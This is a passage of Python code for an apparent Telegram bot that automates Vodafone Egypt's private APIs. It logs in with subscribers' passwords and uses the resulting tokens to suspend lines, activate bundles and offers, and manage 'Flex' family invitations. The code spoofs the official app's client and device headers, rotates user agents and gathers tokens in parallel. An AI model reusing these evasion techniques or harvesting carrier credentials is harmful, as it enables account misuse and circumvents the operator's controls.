        url = f"{self.base_url}/services/dxl/pom/productOrder"
        
        headers = {
            'Authorization': f'Bearer {self.token}',
            'api-version': 'v2',
            'clientId': 'AnaVodafoneAndroid',
            'msisdn': self.num,
            'Accept': 'application/json',
            'Accept-Language': 'ar',
            'Content-Type': 'application/json; charset=UTF-8',
            'User-Agent': random.choice(USER_AGENTS),
            'x-agent-operatingsystem': '12',
            'x-agent-device': 'Samsung SM-M315F',
            'x-agent-version': '2024.3.3',
            'x-agent-build': '593',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'x-agent-version': '2024.12.1'
        }
        
        json_data = {
            '@type': 'LineSuspension',
            'channel': {'name': 'WEBSITE'},
            'orderItem': [{
                'action': 'add',
                'product': {
                    'characteristic': [
                        {'name': 'WorkflowName', 'value': 'GSMAdjustStatus'},
                        {'name': 'nationalId', 'value': self.national},
                        {'name': 'LangId', 'value': 'ar'},
                    ],
                    'relatedParty': [{
                        'name': 'MSISDN',
                        'id': self.num,
                        'role': 'Subscriber',
                    }],
                },
            }],
        }
        
        try:
            response = self.session.post(url, headers=headers, json=json_data, timeout=20)
            response.raise_for_status()
            
            try:
                result_json = response.json()
            except json.JSONDecodeError:
                result_json = {"raw_response": response.text}

            return {"success": True, "message": "تم تقديم طلب تعليق الخط بنجاح!", "details": result_json}
            
        except requests.exceptions.HTTPError as e:
            error_message = f"فشل في تعليق الخط (HTTP {response.status_code})"
            try:
                error_details = response.json()
                error_message += f": {error_details.get('message', 'تفاصيل غير متوفرة')}"
            except:
                error_message += f": {response.text[:100]}..."
                
            logger.error(f"Suspend error for {self.num}: {e}")
            return {"success": False, "message": error_message}

        except requests.exceptions.RequestException as e:
            logger.error(f"Suspend request error for {self.num}: {e}")
            return {"success": False, "message": f"خطأ في الاتصال بالشبكة أثناء التعليق: {e}"}

# تعديل الدالة غير المتزامنة
async def authenticate_multiple_tokens_async(session, username, password, num_tokens=4):
    """
    يقوم بتنفيذ عمليات مصادقة متعددة متزامنة للحصول على عدة توكنات.
    """
    async def authenticate_single():
        # استخدام asyncio.to_thread لتشغيل الدالة المتزامنة في ثريد منفصل
        loop = asyncio.get_event_loop()
        success, token, _, _ = await loop.run_in_executor(None, login, username, password)
        return token if success else None
    
    # إنشاء مهام متزامنة للحصول على التوكنات
    tasks = [authenticate_single() for _ in range(num_tokens)]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    # تصفية النتائج الناجحة
    valid_tokens = [token for token in results if token and isinstance(token, str)]
    
    # إذا لم نحصل على 4 توكنات، نحاول تعويض الناقص
    while len(valid_tokens) < num_tokens:
        needed = num_tokens - len(valid_tokens)
        additional_tasks = [authenticate_single() for _ in range(needed * 2)]
        additional_results = await asyncio.gather(*additional_tasks, return_exceptions=True)
        new_tokens = [token for token in additional_results if token and isinstance(token, str)]
        valid_tokens.extend(new_tokens[:needed])
        if new_tokens:
            await asyncio.sleep(1)
    
    return valid_tokens[:num_tokens]

# ===== دوال باقات الإنترنت المضافة من ملف نت.py (مع تعديل بسيط لاستخدام get_fresh_token الحالية) =====
def get_enc_product_id(token: str, msisdn: str, bundle_id: str) -> Optional[str]:
    """الحصول على EncProductID"""
    url = f"https://mobile.vodafone.com.eg/services/dxl/epo/eligibleProductOffering?customerAccountId={msisdn}&type=MIProducts"
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Connection': "Keep-Alive",
        'Accept': "application/json",
        'Accept-Encoding': "gzip",
        'useCase': "MIProfile",
        'Authorization': f"Bearer {token}",
        'api-version': "v2",
        'clientId': "AnaVodafoneAndroid",
        'Content-Type': "application/json",
        'msisdn': msisdn,
        'Accept-Language': "ar",
        'Cache-Control': 'no-cache'
    }
    try:
        response = requests.get(url, headers=headers, timeout=15)
        response.raise_for_status()
        pattern = r'{"value":"%s","schemeName":"TechnicalID"},{"value":"([^"]+)","schemeName":"EncProductID"}' % (bundle_id)
        match = re.search(pattern, response.text)
        if match:
            return match.group(1)
        return None
    except Exception as e:
        logger.error(f"خطأ في get_enc_product_id: {e}")
        return None

def activate_bundle(token: str, msisdn: str, bundle_id: str, enc: str) -> str:
    """تفعيل الباقة"""
    url = "https://web.vodafone.com.eg/services/dxl/pom/productOrder"
    payload = {
        "channel": {"name": "MobileApp"},
        "orderItem": [{
            "action": "add",
            "product": {
                "characteristic": [
                    {"name": "ExecutionType", "value": "Sync"},
                    {"name": "LangId", "value": "en"},
                    {"name": "OneStepMigrationFlag", "value": "Y"},
                    {"name": "DropAddons", "value": "True"}
                ],
                "relatedParty": [{"id": msisdn, "name": "MSISDN", "role": "Subscriber"}],
                "id": bundle_id,
                "@type": "MI",
                "encProductId": enc
            }
        }],
        "@type": "MIProfile"
    }
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': "application/json",
        'Accept-Encoding': "gzip, deflate, br",
        'Content-Type': "application/json",
        'Authorization': f"Bearer {token}",
        'Accept-Language': "AR",
        'msisdn': msisdn,
        'clientId': "WebsiteConsumer",
        'Origin': "https://web.vodafone.com.eg",
        'Referer': "https://web.vodafone.com.eg/spa/flexManagement/internet",
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache'
    }
    try:
        response = requests.post(url, data=json.dumps(payload), headers=headers, timeout=20)
        if response.status_code in [200, 201]:
            if '{"state":"Completed"}' in response.text:
                return "✅ تم الاشتراك بنجاح. يرجى الشحن الآن."
            else:
                return "✅ تم الاشتراك بنجاح (كود 201/200)."
        elif response.status_code == 400:
            try:
                error_data = response.json().get('errorDescription', response.text)
                if 'consult with your administrator' in error_data or 'Bundle is not available' in error_data:
                    return "⚠️ العرض غير متاح حالياً لهذا الخط."
                return f"❌ فشل التفعيل: {error_data}"
            except:
                return f"❌ فشل التفعيل: {response.text[:200]}"
        elif response.status_code == 403:
            return "❌ تم رفض الطلب (Request Rejected)."
        elif response.status_code == 429:
            return "❌ تجاوز الحد الأقصى للمحاولات. انتظر قليلاً."
        else:
            return f"❌ فشل التفعيل. كود {response.status_code}."
    except Exception as e:
        return f"❌ خطأ: {str(e)}"

def activate_internet_bundle(number: str, password: str, bundle_id: str) -> Tuple[bool, str]:
    """الدالة الرئيسية لتفعيل باقة الإنترنت (تستخدم get_fresh_token الحالية)"""
    token = get_fresh_token(number, password)
    if token.startswith("ERROR:"):
        return False, token
    enc = get_enc_product_id(token, number, bundle_id)
    if enc is None:
        return False, "❌ لم يتم العثور على المعرف المشفر للباقة."
    result = activate_bundle(token, number, bundle_id, enc)
    success = "✅" in result or "تم الاشتراك" in result
    return success, result

def get_egypt_time():
    return datetime.now(egypt_tz)

def convert_to_egypt_time(dt):
    try:
        if isinstance(dt, (int, float)):
            dt = datetime.fromtimestamp(dt / 1000)
        
        if dt.tzinfo is None:
            dt = pytz.utc.localize(dt)
        return dt.astimezone(egypt_tz)
    except:
        return dt

def escape_html(text):
    if not isinstance(text, str):
        text = str(text)
    
    text = text.replace('&', '&amp;')
    text = text.replace('<', '&lt;')
    text = text.replace('>', '&gt;')
    text = text.replace('"', '&quot;')
    text = text.replace("'", '&#39;')
    
    text = re.sub(r'<[^>]*>', '', text)
    
    return text

def retry_on_failure(max_attempts=3, delay=3):
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            attempts = 0
            while attempts < max_attempts:
                try:
                    return func(*args, **kwargs)
                except requests.exceptions.RequestException as e:
                    attempts += 1
                    logger.warning(f"Connection failed (Attempt {attempts}/{max_attempts}). Retrying in {delay}s...")
                    if attempts == max_attempts:
                        raise Exception(f"Failed all connection attempts: {e}")
                    time.sleep(delay)
                except Exception as e:
                    logger.error(f"Unexpected error: {e}")
                    raise
        return wrapper
    return decorator

# ===== دوال فليكس 260 الجديدة =====
# تم استبدالها بالدوال أعلاه

def get_owner_new(on, token, raise_on_error: bool = True) -> Optional[str]:
    """
    Returns the owner's MSISDN or None if not found.
    """
    if token == "error":
        return None
        
    headers = {
        'Accept': 'application/json',
        'Accept-Language': 'EN',
        'Authorization': token,
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Referer': 'https://web.vodafone.com.eg/spa/familySharing/manageFamily',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        'clientId': 'WebsiteConsumer',
        'msisdn': on,
        'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    try:
        resp = requests.get(
            'https://web.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup?type=Family&$.parts.member.type=member',
            headers=headers,
        )

        if resp.status_code != 200:
            if raise_on_error:
                logger.error(f"❌ فشل الطلب: {resp.status_code}")
            return None

        try:
            data = resp.json()
        except ValueError:
            logger.error("❌ الاستجابة ليست JSON صالح")
            return None

        # البيانات قد تكون list أو dict
        items = data if isinstance(data, list) else [data]

        result = []
        for item in items:
            parts = item.get("parts", {}) or {}
            members = parts.get("member", []) or []
            for m in members:
                status = str(m.get("status", "")).strip()
                if status == "1":
                    # رقم الموبايل
                    msisdn = None
                    id_list = m.get("id", [])
                    if isinstance(id_list, list) and id_list:
                        msisdn = id_list[0].get("value")

                    result.append({
                        "msisdn": msisdn,
                        "type": m.get("type"),
                        "status": status
                    })
        
        # Find owner MSISDN
        for item in result:
            if item.get('type') == 'Owner':
                return item.get('msisdn')
        
        return None  # No owner found
        
    except requests.RequestException as e:
        logger.error(f"❌ خطأ في الطلب: {e}")
        return None

def get_owner_number_from_family_new(number, password):
    """الحصول على رقم المالك من بيانات العائلة - النسخة الجديدة"""
    try:
        token = get_authorization_new(number, password)
        if token == "error" or not token:
            return "❌ فشل تسجيل الدخول. تحقق من البيانات."
        
        owner = get_owner_new(number, token)
        if owner:
            return f"👤 رقم المالك (الأونر): {owner}"
        else:
            return "❌ لم يتم العثور على مالك لهذا الرقم. قد لا يكون مشترك في خدمة العائلة."
    except Exception as e:
        logger.error(f"خطأ في get_owner_number_from_family_new: {e}")
        return f"❌ خطأ: {str(e)}"

def get_balance_data(number, token):
    try:
        url = "https://web.vodafone.com.eg/services/dxl/promo/promotion?@type=Promo&$.context.type=offerstab&$.characteristics%5B%40name%3D%27balance%27%5D.value="

        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': "application/json",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'sec-ch-ua-platform': "\"Android\"",
            'Authorization': f"Bearer {token}",
            'Accept-Language': "AR",
            'msisdn': number,
            'clientId': "WebsiteConsumer",
            'channel': "WEB",
            'Content-Type': "application/json",
            'Referer': "https://web.vodafone.com.eg/spa/offers",
            'Connection': 'keep-alive',
            'x-agent-version': '2024.12.1'
        }

        response = requests.get(url, headers=headers, timeout=30)
        return response
        
    except Exception as e:
        raise e

def has_activation_code(offer):
    try:
        characteristics = offer.get('characteristics', [])
        char_dict = {}
        for char in characteristics:
            char_name = char.get('name', '')
            char_value = char.get('value', '')
            if char_name and char_value:
                char_dict[char_name] = char_value
        
        if 'LongScript_Assignment' in char_dict:
            long_script = char_dict['LongScript_Assignment']
            if '#' in long_script:
                lines = long_script.split('\n')
                for line in lines:
                    if '#' in line and any(char.isdigit() for char in line):
                        return True
        return False
    except:
        return False

def filter_offers_by_type(offers, offer_type="all"):
    filtered_offers = []
    
    for offer in offers:
        if not has_activation_code(offer):
            continue
            
        name = offer.get('name', '').lower()
        description = offer.get('description', '').lower()
        full_text = name + " " + description
        
        has_flex = any(word in full_text for word in [
            'فليكس', 'فلکس', 'فلكس', 'flex'
        ])
        
        has_internet = any(word in full_text for word in [
            'ميجا', 'جيجا', 'انترنت', 'نت', 'انترنيت', 'باقة', 'شحنة', 'extreme', 'plus'
        ]) and not has_flex
        
        if offer_type == "internet" and has_internet:
            filtered_offers.append(offer)
        elif offer_type == "flex" and has_flex:
            filtered_offers.append(offer)
        elif offer_type == "all":
            if has_flex or has_internet:
                 filtered_offers.append(offer)
    
    return filtered_offers

def convert_to_12h_time(dt):
    try:
        if isinstance(dt, (int, float)):
            dt = datetime.fromtimestamp(dt / 1000)
        
        egypt_time = convert_to_egypt_time(dt)
        corrected_time = egypt_time - timedelta(hours=2)
        return corrected_time.strftime('%Y-%m-%d %I:%M %p')
    except Exception as e:
        try:
            return dt.strftime('%Y-%m-%d %I:%M %p')
        except:
            return "غير محدد"

def subscribe_to_offer(chat_id, offer_index):
    try:
        state = get_user_state(chat_id)
        if not state or 'offers' not in state.get('data', {}):
            return False, "❌ لا توجد عروض! الرجاء استخدام /start"
            
        if 'token' not in state['data']:
            return False, "❌ انتهت الجلسة! الرجاء استخدام /start"
        
        offers = state['data']['offers']
        
        if offer_index >= len(offers):
            return False, "❌ رقم العرض غير صحيح"
        
        current_offer = offers[offer_index]
        offer_id = current_offer.get('id')
        
        if not offer_id:
            return False, "❌ لا يمكن العثور على معرف العرض"
        
        number = state['data']['number']
        token = state['data']['token']
        
        url = f"https://mobile.vodafone.com.eg/services/dxl/promo/promotion/{offer_id}"
        
        headers = {
            'channel': 'MOBILE',
            'useCase': 'Promo',
            'Authorization': f'Bearer {token}',
            'api-version': 'v2',
            'clientId': 'AnaVodafoneAndroid',
            'msisdn': number,
            'Accept': 'application/json',
            'Accept-Language': 'ar',
            'Content-Type': 'application/json; charset=UTF-8',
            'Host': 'mobile.vodafone.com.eg',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip',
            'User-Agent': random.choice(USER_AGENTS),
            'x-agent-version': '2024.12.1'
        }

        data = {
            "channel": {"id": "0"},
            "characteristics": [{"name": "Param6", "value": "0"}],
            "context": {"type": "offerstabV2"},
            "@type": "Promo"
        }

        response = requests.patch(url, headers=headers, json=data, timeout=30)
        
        if 200 <= response.status_code < 300:
            return True, "✅ تم الاشتراك في العرض بنجاح!"
        elif response.status_code == 400:
            error_text = response.json().get('errorDescription', 'لا يمكن الاشتراك في هذا العرض')
            return False, f"❌ خطأ (400): {error_text}"
        elif response.status_code == 401:
            return False, "❌ انتهت الجلسة! الرجاء استخدام /start"
        elif response.status_code == 403:
            return False, "❌ تم رفض الطلب (Request Rejected)."
        elif response.status_code == 429:
            return False, "❌ تجاوز الحد الأقصى للمحاولات. انتظر قليلاً وحاول مجدداً."
        elif response.status_code == 500:
            return False, "❌ لا يوجد رصيد كافي للاشتراك في العرض"
        else:
            return False, f"❌ خطأ في الاشتراك: {response.status_code}"
            
    except Exception as e:
        return False, f"❌ حدث خطأ أثناء الاشتراك: {escape_html(str(e))}"

def get_web_auth_token(number, password):
    if not BS4_AVAILABLE:
        return "ERROR: لا يمكن تشغيل هذه الميزة. مكتبة BeautifulSoup غير مثبتة."
        
    letters = string.ascii_lowercase
    nonce = ''.join(random.choice(letters) for _ in range(10))
    
    with requests.Session() as session:
        try:
            base_url = 'https://web.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/auth'
            redirect_uri = 'https://web.vodafone.com.eg/ar/KClogin'
            url_action = f"{base_url}?client_id=website&redirect_uri={redirect_uri}&state=random_state&response_mode=query&response_type=code&scope=openid&nonce={nonce}&kc_locale=en"
            
            response_url_action = session.get(url_action, timeout=15)
            soup = BeautifulSoup(response_url_action.content, 'html.parser') 
            form = soup.find('form')
            if not form:
                return "ERROR: فشل في جلب نموذج تسجيل الدخول (Form)."
            form_action = form.get('action')

            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': random.choice(USER_AGENTS),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'ar',
                'Connection': 'keep-alive'
            }
            
            data = {'username': number, 'password': password}
            response_login = session.post(form_action, headers=headers, data=data, allow_redirects=False, timeout=15)
            
            if response_login.status_code == 302 and 'code=' in response_login.headers.get('Location', ''):
                location = response_login.headers['Location']
                code = location.split('code=')[1].split('&')[0] 
            elif "KClogin" in response_login.url or response_login.status_code == 200:
                 return "ERROR: فشل تسجيل الدخول. تأكد من الرقم وكلمة المرور."
            else:
                 return "ERROR: فشل غير متوقع أثناء تسجيل الدخول."

            headers_token = {
                'Accept': '*/*', 
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://web.vodafone.com.eg', 
                'User-Agent': random.choice(USER_AGENTS),
                'Accept-Language': 'ar',
                'Connection': 'keep-alive'
            }
            
            data_token = {
                'code': code, 
                'grant_type': 'authorization_code',
                'client_id': 'website', 
                'redirect_uri': redirect_uri
            }
            
            token_response = session.post(
                'https://web.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token',
                headers=headers_token, data=data_token, timeout=15)
            
            token = token_response.json().get('access_token')
            if token:
                 return token
            return "ERROR: فشل في جلب التوكن بعد المصادقة."

        except requests.exceptions.RequestException as e:
            return f"ERROR: خطأ في الاتصال بالشبكة أو انتهاء وقت الطلب: {e}"
        except Exception as e:
            return f"ERROR: خطأ غير متوقع: {e}"

def get_eligible_products(token, number):
    url2 = f'https://web.vodafone.com.eg/services/dxl/epo/eligibleProductOffering?customerAccountId={number}&parts.customerAccount.type=Consumer&Accept-Language=ar&type=Tarrifs'
    
    headers1 = {
        "Host": "web.vodafone.com.eg",
        "Authorization": f"Bearer {token}",
        "api-version": "v2",
        "x-agent-operatingsystem": "11",
        "clientId": "AnaVodafoneAndroid",
        "x-agent-device": "Xiaomi M2010J19SG",
        "x-agent-version": "2024.7.2.1",
        "x-agent-build": "612",
        "msisdn": number,
        "Accept": "application/json",
        "Accept-Language": "ar",
        "Content-Type": "application/json; charset=UTF-8",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "User-Agent": random.choice(USER_AGENTS),
        "Cache-Control": "no-cache",
        'x-agent-version': '2024.12.1'
    }
    
    return requests.get(url2, headers=headers1, timeout=15)

def get_stop_ads_url():
    return "https://vf.eg/cyg"

# ===== دوال فليكس 260 =====
def get_flexes_balance(token, number):
    """دالة الحصول على نسبة الفليكس"""
    headers = {
        'Accept': 'application/json',
        'Accept-Language': 'EN',
        'Authorization': token if token.startswith('Bearer ') else f'Bearer {token}',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Referer': 'https://web.vodafone.com.eg/spa/familySharing',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        'clientId': 'WebsiteConsumer',
        'msisdn': number,
        'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    try:
        response = requests.get(
            f'https://web.vodafone.com.eg/services/dxl/usage/usageConsumptionReport?bucket.product.publicIdentifier={number}&@type=aggregated',
            headers=headers,
            timeout=30
        )
        
        if response.status_code == 200:
            data = response.json()

            for item in data:
                if item.get("@type") == "OTHERS":
                    for bucket in item.get("bucket", []):
                        if bucket.get("usageType") == "limit":
                            for balance in bucket.get("bucketBalance", []):
                                if balance.get("@type") == "Remaining" and balance["remainingValue"]["units"] == "FLEX":
                                    flex_amount = balance["remainingValue"]["amount"]
                                    return flex_amount
            
            return None
            
        elif response.status_code == 401:
            return "❌ التوكن منتهي الصلاحية أو غير صالح"
        else:
            return f"❌ خطأ في الاستعلام: {response.status_code}"
            
    except requests.exceptions.Timeout:
        return "❌ انتهت مهلة الاتصال أثناء الاستعلام عن الفليكس"
    except Exception as e:
        return f"❌ خطأ أثناء الاستعلام عن الفليكس: {e}"

def get_owner_number_from_family(number, password):
    """الحصول على رقم المالك من بيانات العائلة - باستخدام الدوال الجديدة"""
    try:
        token = get_authorization_new(number, password)
        if token == "error" or not token:
            return "❌ فشل تسجيل الدخول. تحقق من البيانات."
        
        owner = get_owner_new(number, token)
        if owner:
            return f"👤 رقم المالك (الأونر): {owner}"
        else:
            return "❌ لم يتم العثور على مالك لهذا الرقم. قد لا يكون مشترك في خدمة العائلة."
    except Exception as e:
        logger.error(f"خطأ في get_owner_number_from_family: {e}")
        return f"❌ خطأ: {str(e)}"

def send_invitation_only(owner_number, owner_password, new_member_number, quota_percentage):
    """اسكربت إرسال دعوة فقط (دون قبول)"""
    
    def get_token(phone_number, password):
        """الحصول على توكن من فودافون"""
        success, token, _, _ = login(phone_number, password)
        if success:
            return token, True
        else:
            return f"❌ فشل تسجيل الدخول", False
    
    # الحصول على توكن المالك
    owner_token, owner_success = get_token(owner_number, owner_password)
    
    if not owner_success:
        return {"success": False, "message": f"❌ فشل تسجيل دخول المالك: {owner_token}", "details": {}}
    
    def create_family_headers(token, msisdn):
        """إنشاء headers مخصصة لطلبات العائلة"""
        headers = {
            "Authorization": f"Bearer {token}",
            "msisdn": msisdn,
            "Accept": "application/json",
            "Content-Type": "application/json; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
            "Origin": "https://web.vodafone.com.eg",
            "Referer": "https://web.vodafone.com.eg/spa/familySharing",
            "clientId": "WebsiteConsumer",
            "Host": "web.vodafone.com.eg",
            "Connection": "keep-alive",
            "Accept-Language": "ar-EG,ar;q=0.9,en;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "X-Requested-With": "XMLHttpRequest"
        }
        
        return headers
    
    def send_invitation(token, owner_num, member_num, quota):
        """إرسال دعوة لعضو جديد"""
        url = "https://web.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
        
        headers = create_family_headers(token, owner_num)
        
        payload = {
            "name": "FlexFamily",
            "type": "SendInvitation",
            "category": [
                {"value": "523", "listHierarchyId": "PackageID"},
                {"value": "47", "listHierarchyId": "TemplateID"},
                {"value": "523", "listHierarchyId": "TierID"},
                {"value": "percentage", "listHierarchyId": "familybehavior"}
            ],
            "parts": {
                "member": [
                    {"id": [{"value": owner_num, "schemeName": "MSISDN"}], "type": "Owner"},
                    {"id": [{"value": member_num, "schemeName": "MSISDN"}], "type": "Member"}
                ],
                "characteristicsValue": {
                    "characteristicsValue": [
                        {"characteristicName": "quotaDist1", "value": str(quota), "type": "percentage"}
                    ]
                }
            }
        }
        
        try:
            time.sleep(1)
            
            response = requests.post(url, headers=headers, json=payload, timeout=45)
            
            if response.status_code in [200, 201, 204]:
                return {"success": True, "message": "✅ تم إرسال الدعوة بنجاح!", "details": {}}
            else:
                error_msg = f"❌ فشل إرسال الدعوة: {response.status_code}"
                try:
                    error_details = response.json()
                    # ===== تعديل رسالة الخطأ للكود 2029 =====
                    if error_details.get('code') == '2029':
                        return {"success": False, "message": "❌ فشل إرسال الدعوة: الرقم ف عيله تانيه خرجه و حاول تاني بعد ربع ساعه", "details": error_details}
                    # ===== تعديل رسالة الخطأ للكود 2027 =====
                    if error_details.get('code') == '2027':
                        return {"success": False, "message": "❌❌ الفرد ده فليكس جديد او فاتوره حوله ل ريح بالك و حاول تاني", "details": error_details}
                    error_msg += f"\n📝 التفاصيل: {json.dumps(error_details, ensure_ascii=False, indent=2)}"
                    return {"success": False, "message": error_msg, "details": error_details}
                except:
                    if response.text:
                        error_msg += f"\n📝 نص الاستجابة: {response.text[:300]}"
                    return {"success": False, "message": error_msg, "details": {}}
                
        except Exception as e:
            return {"success": False, "message": f"❌ خطأ في الاتصال: {e}", "details": {}}
    
    # إرسال الدعوة فقط
    result = send_invitation(owner_token, owner_number, new_member_number, quota_percentage)
    
    if result["success"]:
        return {"success": True, "message": result["message"], "details": {"owner": owner_number, "member": new_member_number}}
    else:
        return result

# =============================
# دالة قبول الدعوة (محدثة)
# =============================
def accept_invitation_only(member_number, member_password, owner_number):
    """
    قبول دعوة فليكس مباشرة باستخدام بيانات العضو فقط (بدون الحاجة لإدخال نسبة)
    """
    # الحصول على توكن العضو
    success, token, _, _ = login(member_number, member_password)
    if not success:
        return {"success": False, "message": "❌ فشل تسجيل دخول العضو. تحقق من البيانات.", "details": {}}
    
    url = "https://mobile.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
    
    # استخدام نفس البنية التي كانت في الدالة القديمة مع تعديل بسيط
    payload = {
        "category": [{"listHierarchyId": "TemplateID", "value": "47"}],
        "name": "FlexFamily",
        "parts": {
            "member": [
                {"id": [{"schemeName": "MSISDN", "value": f"2{owner_number}"}], "type": "Owner"},
                {"id": [{"schemeName": "MSISDN", "value": f"2{member_number}"}], "type": "Member"}
            ]
        },
        "type": "AcceptInvitation"
    }
    
    headers = {
        "User-Agent": "okhttp/4.11.0",
        "Connection": "Keep-Alive",
        "Accept": "application/json",
        "Authorization": f"Bearer {token}",
        "api_id": "APP",
        "api-version": "v2",
        "clientId": "AnaVodafoneAndroid",
        "msisdn": member_number,
        "Content-Type": "application/json; charset=UTF-8",
        "Accept-Language": "ar"
    }
    
    try:
        r = requests.patch(url, data=json.dumps(payload), headers=headers, timeout=30)
        if r.status_code in [200, 201]:
            return {"success": True, "message": "✅ تم قبول الدعوة بنجاح!", "details": {"owner": owner_number, "member": member_number}}
        else:
            error_msg = f"❌ فشل قبول الدعوة (كود: {r.status_code})"
            try:
                error_details = r.json()
                error_msg += f"\n{error_details.get('errorDescription', '')}"
                return {"success": False, "message": error_msg, "details": error_details}
            except:
                return {"success": False, "message": error_msg, "details": {}}
    except Exception as e:
        return {"success": False, "message": f"❌ خطأ في الاتصال: {e}", "details": {}}

def send_and_accept_invitation(owner_number, owner_password, new_member_number, new_member_password, quota_percentage):
    """اسكربت إرسال وقبول دعوة فودافون فليكس"""
    
    def get_token(phone_number, password):
        """الحصول على توكن من فودافون"""
        success, token, _, _ = login(phone_number, password)
        if success:
            return token, True
        else:
            return f"❌ فشل تسجيل الدخول", False
    
    # الحصول على توكن المالك
    owner_token, owner_success = get_token(owner_number, owner_password)
    
    if not owner_success:
        return {"success": False, "message": f"❌ فشل تسجيل دخول المالك: {owner_token}", "details": {}}
    
    def create_family_headers(token, msisdn, is_owner=True):
        """إنشاء headers مخصصة لطلبات العائلة"""
        subdomain = "web.vodafone.com.eg"
        
        headers = {
            "Authorization": f"Bearer {token}",
            "msisdn": msisdn,
            "Accept": "application/json",
            "Content-Type": "application/json; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
            "Origin": f"https://{subdomain}",
            "Referer": f"https://{subdomain}/spa/familySharing",
            "clientId": "WebsiteConsumer",
            "Host": subdomain,
            "Connection": "keep-alive",
            "Accept-Language": "ar-EG,ar;q=0.9,en;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "X-Requested-With": "XMLHttpRequest"
        }
        
        return headers
    
    def send_invitation(token, owner_num, member_num, quota):
        """إرسال دعوة لعضو جديد"""
        url = "https://web.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
        
        headers = create_family_headers(token, owner_num)
        
        payload = {
            "name": "FlexFamily",
            "type": "SendInvitation",
            "category": [
                {"value": "523", "listHierarchyId": "PackageID"},
                {"value": "47", "listHierarchyId": "TemplateID"},
                {"value": "523", "listHierarchyId": "TierID"},
                {"value": "percentage", "listHierarchyId": "familybehavior"}
            ],
            "parts": {
                "member": [
                    {"id": [{"value": owner_num, "schemeName": "MSISDN"}], "type": "Owner"},
                    {"id": [{"value": member_num, "schemeName": "MSISDN"}], "type": "Member"}
                ],
                "characteristicsValue": {
                    "characteristicsValue": [
                        {"characteristicName": "quotaDist1", "value": str(quota), "type": "percentage"}
                    ]
                }
            }
        }
        
        try:
            time.sleep(1)
            
            response = requests.post(url, headers=headers, json=payload, timeout=45)
            
            if response.status_code in [200, 201, 204]:
                return {"success": True, "message": "✅ تم إرسال الدعوة بنجاح!", "details": {}}
            else:
                error_msg = f"❌ فشل إرسال الدعوة: {response.status_code}"
                try:
                    error_details = response.json()
                    # ===== تعديل رسالة الخطأ للكود 2029 =====
                    if error_details.get('code') == '2029':
                        return {"success": False, "message": "❌ فشل إرسال الدعوة: الرقم ف عيله تانيه خرجه و حاول تاني بعد ربع ساعه", "details": error_details}
                    # ===== تعديل رسالة الخطأ للكود 2027 =====
                    if error_details.get('code') == '2027':
                        return {"success": False, "message": "❌❌ الفرد ده فليكس جديد او فاتوره حوله ل ريح بالك و حاول تاني", "details": error_details}
                    error_msg += f"\n📝 التفاصيل: {json.dumps(error_details, ensure_ascii=False, indent=2)}"
                    return {"success": False, "message": error_msg, "details": error_details}
                except:
                    if response.text:
                        error_msg += f"\n📝 نص الاستجابة: {response.text[:300]}"
                    return {"success": False, "message": error_msg, "details": {}}
                
        except Exception as e:
            return {"success": False, "message": f"❌ خطأ في الاتصال: {e}", "details": {}}
    
    # إرسال الدعوة
